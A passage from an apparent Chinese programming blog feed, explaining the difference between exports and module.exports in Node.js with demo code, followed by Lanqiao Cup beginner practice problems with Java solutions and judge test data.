    <content type="html"><![CDATA[<blockquote><p>学习<code>Seajs</code>时，看到了<code>exports.doSomething</code>和<code>module.exports</code>，想对这两者的区别一探究竟。</p></blockquote><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-2-10/97116137-file_1486708942813_1278d.png" alt=""></p><h4 id="一、官方解释"><a href="#一、官方解释" class="headerlink" title="一、官方解释"></a>一、官方解释</h4><p>因为<code>SeaJs</code>和<code>Nodejs</code>都是基于<code>CommonJS</code>,所以直接看的<code>Node</code>的官方文档解释</p><h5 id="Module-exports"><a href="#Module-exports" class="headerlink" title="Module.exports"></a>Module.exports</h5><blockquote><p>The <strong>module.exports</strong> object is created by the Module system. Sometimes this is not acceptable; many want their module to be an instance of some class. To do this, assign the desired export object to <strong>module.exports</strong>. Note that assigning the desired object to <strong>exports</strong> will simply rebind the local <strong>exports</strong> variable, which is probably not what you want to do.</p></blockquote><blockquote><p>译文：<strong>module.exports</strong>对象是由模块系统创建的。 有时这是难以接受的；许多人希望他们的模块成为某个类的实例。 为了实现这个，需要将期望导出的对象赋值给<strong>module.exports</strong>。 注意，将期望的对象赋值给<strong>exports</strong>会简单地重新绑定到本地<strong>exports</strong>变量上，这可能不是你想要的。</p></blockquote><h5 id="exports"><a href="#exports" class="headerlink" title="exports"></a>exports</h5><blockquote><p>The <strong>exports</strong> variable is available within a module’s file-level scope, and is assigned the value of <strong>module.exports</strong> before the module is evaluated. It allows a shortcut, so that <strong>module.exports.f = …</strong> can be written more succinctly as <strong>exports.f = ….</strong> However, be aware that like any variable, if a new value is assigned to <strong>exports</strong>, it is no longer bound to <strong>module.exports</strong>:</p></blockquote><blockquote><p>译文：<strong>exports</strong>变量是在模块的文件级别作用域内有效的，它在模块被执行前被赋于 <strong>module.exports</strong> 的值。它有一个快捷方式，以便 <strong>module.exports.f = …</strong> 可以被更简洁地写成<strong>exports.f = …</strong>。 注意，就像任何变量，如果一个新的值被赋值给<strong>exports</strong>，它就不再绑定到<strong>module.exports</strong>(其实是<strong>exports.属性</strong>会自动挂载到没有命名冲突的<strong>module.exports.属性</strong>)</p></blockquote><h5 id="require"><a href="#require" class="headerlink" title="require"></a>require</h5><p>从require导入方式去理解，关键有两个变量(全局变量<code>module.exports</code>，局部变量<code>exports</code>)、一个返回值(<code>module.exports</code>)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">require</span>(<span class="params">...</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="built_in">module</span> = &#123; <span class="attr">exports</span>: &#123;&#125; &#125;;</span><br><span class="line">  (<span class="function">(<span class="params"><span class="built_in">module</span>, exports</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 你的被引入代码 Start</span></span><br><span class="line">    <span class="comment">// var exports = module.exports = &#123;&#125;; (默认都有的)</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">some_func</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">    exports = some_func;</span><br><span class="line">    <span class="comment">// 此时，exports不再挂载到module.exports，</span></span><br><span class="line">    <span class="comment">// export将导出&#123;&#125;默认对象</span></span><br><span class="line">    <span class="built_in">module</span>.exports = some_func;</span><br><span class="line">    <span class="comment">// 此时，这个模块将导出some_func对象，覆盖exports上的some_func</span></span><br><span class="line">     <span class="comment">// 你的被引入代码 End</span></span><br><span class="line">  &#125;)(<span class="built_in">module</span>, <span class="built_in">module</span>.exports);</span><br><span class="line"> <span class="comment">// 不管是exports还是module.exports，最后返回的还是module.exports</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">module</span>.exports;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二、Demo事例"><a href="#二、Demo事例" class="headerlink" title="二、Demo事例"></a>二、Demo事例</h4><h5 id="事例一：1-js"><a href="#事例一：1-js" class="headerlink" title="事例一：1.js"></a>事例一：<code>1.js</code></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(exports); <span class="comment">// &#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">module</span>.exports);  <span class="comment">// &#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(exports === <span class="built_in">module</span>.exports);<span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(exports == <span class="built_in">module</span>.exports);<span class="comment">// true</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> Module &#123;</span></span><br><span class="line"><span class="comment">  id: '.',</span></span><br><span class="line"><span class="comment">  exports: &#123;&#125;,</span></span><br><span class="line"><span class="comment">  parent: null,</span></span><br><span class="line"><span class="comment">  filename: '/1.js',</span></span><br><span class="line"><span class="comment">  loaded: false,</span></span><br><span class="line"><span class="comment">  children: [],</span></span><br><span class="line"><span class="comment">  paths:</span></span><br><span class="line"><span class="comment">   [</span></span><br><span class="line"><span class="comment">     '/node_modules' ]</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">module</span>);</span><br></pre></td></tr></table></figure><h6 id="从事例一中，可以看出来"><a href="#从事例一中，可以看出来" class="headerlink" title="从事例一中，可以看出来"></a>从事例一中，可以看出来</h6><ul><li>1.每个<code>js</code>文件一创建，都有一个<code>var exports = module.exports = {};</code>，使<code>exports</code>和<code>module.exports</code>都指向一个空对象。</li><li>2.<code>module</code>是全局内置对象，<code>exports</code>是被<code>var</code>创建的局部对象。</li><li>3.<code>module.exports</code>和<code>exports</code>所指向的内存地址相同</li></ul><h5 id="事例二：2-js、3-js"><a href="#事例二：2-js、3-js" class="headerlink" title="事例二：2.js、3.js"></a>事例二：<code>2.js</code>、<code>3.js</code></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2.js</span></span><br><span class="line">exports.id = <span class="string">'exports的id'</span>;</span><br><span class="line">exports.id2 = <span class="string">'exports的id2'</span>;</span><br><span class="line">exports.func = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'exports的函数'</span>);</span><br><span class="line">&#125;;</span><br><span class="line">exports.func2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'exports的函数2'</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">id: <span class="string">'module.exports的id'</span>,</span><br><span class="line">func:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'module.exports的函数'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3.js</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">'./2.js'</span>);</span><br><span class="line"><span class="comment">// 当属性和函数在module.exports都有定义时：</span></span><br><span class="line"><span class="built_in">console</span>.log(a.id);  <span class="comment">// module.exports的id</span></span><br><span class="line"><span class="built_in">console</span>.log(a.func()); <span class="comment">// module.exports的函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当属性在module.exports没有定义，函数在module.exports有定义</span></span><br><span class="line"><span class="built_in">console</span>.log(a.id2);  <span class="comment">// undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(a.func());  <span class="comment">// module.exports的函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当函数在module.exports没有定义，属性在module.exports有定义</span></span><br><span class="line"><span class="built_in">console</span>.log(a.id);<span class="comment">// module.exports的id</span></span><br><span class="line"><span class="built_in">console</span>.log(a.func2());<span class="comment">// 报错了 TypeError: a.func2 is not a function</span></span><br></pre></td></tr></table></figure><h6 id="由例二可以知道："><a href="#由例二可以知道：" class="headerlink" title="由例二可以知道："></a>由例二可以知道：</h6><ul><li>1.<code>module.exports</code>像是<code>exports</code>的大哥，当<code>module.exports</code>以<code>{}</code>整体导出时会覆盖<code>exports</code>的属性和方法，</li><li>2.注意，若只是将属性/方法挂载在<code>module.exports.</code>/<code>exports.</code>上时，<code>exports.id=1</code>和<code>module.exports.id=100</code>，<code>module.exports.id=function(){}</code>和<code>exports.id=function(){}</code>，最后id的值取决于<code>exports.id</code>和<code>module.exports.id</code>的顺序，谁在后，就是最后的值</li></ul><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-2-11/3342799-file_1486777354466_11a75.png" alt=""></p><ul><li>3.若<code>exports</code>和<code>module.exports</code>同时赋值时，<code>exports</code>所使用的属性和方法必须出现在<code>module.exports</code>，若属性没有在<code>module.exports</code>中定义的话，出现<code>undefined</code>，若方法没有在<code>module.exports</code>中定义，会抛出<code>TypeError</code>错误。</li></ul><h5 id="例三-4-js、5-js"><a href="#例三-4-js、5-js" class="headerlink" title="例三 4.js、5.js"></a>例三 <code>4.js</code>、<code>5.js</code></h5><p><code>module.exports</code>的对象、<code>prototype</code>、<code>构造函数</code>使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4.js</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">'./5.js'</span>);</span><br><span class="line"><span class="comment">// 若传的是类，new一个对象</span></span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> a(<span class="string">'Kylin'</span>,<span class="number">20</span>);</span><br><span class="line"><span class="built_in">console</span>.log(person.speak()); <span class="comment">// my name is Kylin ,my age is 20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 若不需要在构造函数时初始化参数，直接调用方法/属性</span></span><br><span class="line"><span class="comment">// a.speak();  // my name is kylin ,my age is 20</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 5.js</span></span><br><span class="line"><span class="comment">// Person类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.name = name;</span><br><span class="line"><span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 为类添加方法</span></span><br><span class="line">Person.prototype.speak = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'my name is '</span>+<span class="keyword">this</span>.name+<span class="string">' ,my age is '</span>+<span class="keyword">this</span>.age);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回类</span></span><br><span class="line"><span class="built_in">module</span>.exports = Person;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 若构造函数没有传入参数(name,age)，直接传入对象</span></span><br><span class="line"><span class="comment">// module.exports = new Person('kylin',20);</span></span><br></pre></td></tr></table></figure><h6 id="说了这么多，其实建议就是，如果只是单一属性或方法的话，就使用exports-属性-方法。要是导出多个属性或方法或使用对象构造方法，结合prototype等，就建议使用module-exports-。文章有很多地方描述的可能不是很准确，提到的点也不够全面，如果有不对的地方，还望斧正！"><a href="#说了这么多，其实建议就是，如果只是单一属性或方法的话，就使用exports-属性-方法。要是导出多个属性或方法或使用对象构造方法，结合prototype等，就建议使用module-exports-。文章有很多地方描述的可能不是很准确，提到的点也不够全面，如果有不对的地方，还望斧正！" class="headerlink" title="说了这么多，其实建议就是，如果只是单一属性或方法的话，就使用exports.属性/方法。要是导出多个属性或方法或使用对象构造方法，结合prototype等，就建议使用module.exports = {}。文章有很多地方描述的可能不是很准确，提到的点也不够全面，如果有不对的地方，还望斧正！"></a>说了这么多，其实建议就是，如果只是单一属性或方法的话，就使用<code>exports.属性/方法</code>。要是导出多个属性或方法或使用<code>对象构造方法</code>，结合<code>prototype</code>等，就建议使用<code>module.exports = {}</code>。文章有很多地方描述的可能不是很准确，提到的点也不够全面，如果有不对的地方，还望斧正！</h6><blockquote><p>参考资料：<a href="http://nodejs.cn/api/modules.html#modules_module_exports" target="_blank" rel="noopener">Nodejs官方文档(中文)</a>、<a href="http://www.hacksparrow.com/node-js-exports-vs-module-exports.html" target="_blank" rel="noopener">Node.js Module – exports vs module.exports</a>、<a href="https://www.sitepoint.com/understanding-module-exports-exports-node-js/" target="_blank" rel="noopener">Understanding module.exports and exports in Node.js</a>、<a href="https://cnodejs.org/topic/5231a630101e574521e45ef8" target="_blank" rel="noopener">exports 和 module.exports 的区别</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;学习&lt;code&gt;Seajs&lt;/code&gt;时，看到了&lt;code&gt;exports.doSomething&lt;/code&gt;和&lt;code&gt;module.exports&lt;/code&gt;，想对这两者的区别一探究竟。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;im
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>算法练习(Java)</title>
    <link href="https://www.ycjcl.cc/2018/07/08/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0(Java)/"/>
    <id>https://www.ycjcl.cc/2018/07/08/算法练习(Java)/</id>
    <published>2018-07-07T17:17:20.000Z</published>
    <updated>2018-07-07T17:17:42.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>先来首音乐吧！</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="110" src="//music.163.com/outchain/player?type=0&id=519118660&auto=1&height=90"></iframe><h1 id="蓝桥杯练习系统"><a href="#蓝桥杯练习系统" class="headerlink" title="蓝桥杯练习系统"></a>蓝桥杯练习系统</h1><h2 id="入门训练"><a href="#入门训练" class="headerlink" title="入门训练"></a>入门训练</h2><p>一、题目：Fibonacci数列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">Fibonacci数列的递推公式为：Fn=Fn-1+Fn-2，其中F1=F2=1。</span><br><span class="line"></span><br><span class="line">当n比较大时，Fn也非常大，现在我们想知道，Fn除以10007的余数是多少。</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">输入包含一个整数n。</span><br><span class="line">输出格式</span><br><span class="line">输出一行，包含一个整数，表示Fn除以10007的余数。</span><br><span class="line">说明：在本题中，答案是要求Fn除以10007的余数，因此我们只要能算出这个余数即可，而不需要先计算出Fn的准确值，再将计算的结果除以10007取余数，直接计算余数往往比先算出原数再取余简单。</span><br><span class="line"></span><br><span class="line">样例输入</span><br><span class="line">10</span><br><span class="line">样例输出</span><br><span class="line">55</span><br><span class="line">样例输入</span><br><span class="line">22</span><br><span class="line">样例输出</span><br><span class="line">7704</span><br><span class="line">数据规模与约定</span><br><span class="line">1 &lt;= n &lt;= 1,000,000。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> n = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">1000000</span>];</span><br><span class="line">        arr[<span class="number">1</span>] = arr[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt;= n;i++)&#123;</span><br><span class="line">             arr[i] = (arr[i-<span class="number">1</span>]+arr[i-<span class="number">2</span>]) % <span class="number">10007</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(arr[n]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">评测数据(输入,输出)：</span><br><span class="line">(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">(<span class="number">10</span>,<span class="number">55</span>)</span><br><span class="line">(<span class="number">55</span>,<span class="number">2091</span>)</span><br><span class="line">(<span class="number">100</span>,<span class="number">6545</span>)</span><br><span class="line">(<span class="number">500</span>,<span class="number">8907</span>)</span><br><span class="line">(<span class="number">999</span>,<span class="number">4659</span>)</span><br><span class="line">(<span class="number">9999</span>,<span class="number">9973</span>)</span><br><span class="line">(<span class="number">99999</span>,<span class="number">6415</span>)</span><br><span class="line">(<span class="number">999999</span>,<span class="number">3131</span>)</span><br></pre></td></tr></table></figure><p>二、题目：圆的面积</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">给定圆的半径r，求圆的面积。</span><br><span class="line">输入格式</span><br><span class="line">输入包含一个整数r，表示圆的半径。</span><br><span class="line">输出格式</span><br><span class="line">输出一行，包含一个实数，四舍五入保留小数点后7位，表示圆的面积。</span><br><span class="line">说明：在本题中，输入是一个整数，但是输出是一个实数。</span><br><span class="line"></span><br><span class="line">对于实数输出的问题，请一定看清楚实数输出的要求，比如本题中要求保留小数点后7位，则你的程序必须严格的输出7位小数，输出过多或者过少的小数位数都是不行的，都会被认为错误。</span><br><span class="line"></span><br><span class="line">实数输出的问题如果没有特别说明，舍入都是按四舍五入进行。</span><br><span class="line"></span><br><span class="line">样例输入</span><br><span class="line">4</span><br><span class="line">样例输出</span><br><span class="line">50.2654825</span><br><span class="line">数据规模与约定</span><br><span class="line">1 &lt;= r &lt;= 10000。</span><br><span class="line">提示</span><br><span class="line">本题对精度要求较高，请注意π的值应该取较精确的值。你可以使用常量来表示π，比如PI=3.14159265358979323，也可以使用数学公式来求π，比如PI=atan(1.0)*4。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> r = in.nextInt();</span><br><span class="line">        <span class="keyword">double</span> area = Math.PI * r * r;</span><br><span class="line">        System.out.println(String.format(<span class="string">"%.7f"</span>,area));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">评测数据(输入,输出)：</span><br><span class="line">(<span class="number">10</span>,<span class="number">314.1592654</span>)</span><br><span class="line">(<span class="number">20</span>,<span class="number">1256.6370614</span>)</span><br><span class="line">(<span class="number">40</span>,<span class="number">5026.5482457</span>)</span><br><span class="line">(<span class="number">80</span>,<span class="number">20106.1929830</span>)</span><br><span class="line">(<span class="number">160</span>,<span class="number">80424.7719319</span>)</span><br><span class="line">(<span class="number">320</span>,<span class="number">321699.0877276</span>)</span><br><span class="line">(<span class="number">640</span>,<span class="number">1286796.3509104</span>)</span><br><span class="line">(<span class="number">1280</span>,<span class="number">5147185.4036415</span>)</span><br><span class="line">(<span class="number">2560</span>,<span class="number">20588741.6145661</span>)</span><br><span class="line">(<span class="number">5120</span>,<span class="number">82354966.4582643</span>)</span><br></pre></td></tr></table></figure><p>三、序列求和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">求1+2+3+...+n的值。</span><br><span class="line">输入格式</span><br><span class="line">输入包括一个整数n。</span><br><span class="line">输出格式</span><br><span class="line">输出一行，包括一个整数，表示1+2+3+...+n的值。</span><br><span class="line">样例输入</span><br><span class="line">4</span><br><span class="line">样例输出</span><br><span class="line">10</span><br><span class="line">样例输入</span><br><span class="line">100</span><br><span class="line">说明：有一些试题会给出多组样例输入输出以帮助你更好的做题。</span><br><span class="line"></span><br><span class="line">一般在提交之前所有这些样例都需要测试通过才行，但这不代表这几组样例数据都正确了你的程序就是完全正确的，潜在的错误可能仍然导致你的得分较低。</span><br><span class="line"></span><br><span class="line">样例输出</span><br><span class="line">5050</span><br><span class="line">数据规模与约定</span><br><span class="line">1 &lt;= n &lt;= 1,000,000,000。</span><br><span class="line">说明：请注意这里的数据规模。</span><br><span class="line"></span><br><span class="line">本题直接的想法是直接使用一个循环来累加，然而，当数据规模很大时，这种“暴力”的方法往往会导致超时。此时你需要想想其他方法。你可以试一试，如果使用1000000000作为你的程序的输入，你的程序是不是能在规定的上面规定的时限内运行出来。</span><br><span class="line"></span><br><span class="line">本题另一个要值得注意的地方是答案的大小不在你的语言默认的整型(int)范围内，如果使用整型来保存结果，会导致结果错误。</span><br><span class="line"></span><br><span class="line">如果你使用C++或C语言而且准备使用printf输出结果，则你的格式字符串应该写成%I64d以输出long long类型的整数。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">long</span> n = in.nextLong();</span><br><span class="line">        <span class="keyword">long</span> sum = (n+<span class="number">1</span>) * n /<span class="number">2</span>;</span><br><span class="line">        System.out.println(sum);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">评测数据(输入,输出)：</span><br><span class="line">(,)</span><br><span class="line">(,)</span><br><span class="line">(,)</span><br><span class="line">(,)</span><br><span class="line">(,)</span><br><span class="line">(,)</span><br><span class="line">(,)</span><br><span class="line">(,)</span><br><span class="line">(,)</span><br><span class="line">(,)</span><br></pre></td></tr></table></figure><p>四、A+B问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">输入A、B，输出A+B。</span><br><span class="line">说明：在“问题描述”这部分，会给出试题的意思，以及所要求的目标。</span><br><span class="line">输入格式</span><br><span class="line">输入的第一行包括两个整数，由空格分隔，分别表示A、B。</span><br><span class="line">说明：“输入格式”是描述在测试你的程序时，所给的输入一定满足的格式。</span><br><span class="line"></span><br><span class="line">做题时你应该假设所给的输入是一定满足输入格式的要求的，所以你不需要对输入的格式进行检查。多余的格式检查可能会适得其反，使用你的程序错误。</span><br><span class="line"></span><br><span class="line">在测试的时候，系统会自动将输入数据输入到你的程序中，你不能给任何提示。比如，你在输入的时候提示“请输入A、B”之类的话是不需要的，这些多余的输出会使得你的程序被判定为错误。</span><br><span class="line"></span><br><span class="line">输出格式</span><br><span class="line">输出一行，包括一个整数，表示A+B的值。</span><br><span class="line">说明：“输出格式”是要求你的程序在输出结果的时候必须满足的格式。</span><br><span class="line"></span><br><span class="line">在输出时，你的程序必须满足这个格式的要求，不能少任何内容，也不能多任何内容。如果你的内容和输出格式要求的不一样，你的程序会被判断为错误，包括你输出了提示信息、中间调试信息、计时或者统计的信息等。</span><br><span class="line"></span><br><span class="line">样例输入</span><br><span class="line">12 45</span><br><span 